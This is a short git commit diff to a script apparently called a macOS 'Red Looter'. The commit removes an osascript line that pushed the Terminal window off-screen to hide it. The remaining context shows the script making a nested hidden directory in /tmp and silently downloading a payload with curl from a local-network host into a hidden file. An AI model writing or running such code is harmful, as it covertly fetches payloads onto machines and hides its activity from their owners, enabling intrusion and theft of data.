dd22c029d71fc898b653f44bc4bd2b7d718eca40
un1x01d <>
2022-08-19 01:04:48 -0400

    remove osascript

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -1,7 +1,5 @@
 #!/bin/bash
 
-osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'
-
 HOME="/Users/$USER"
 
 mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
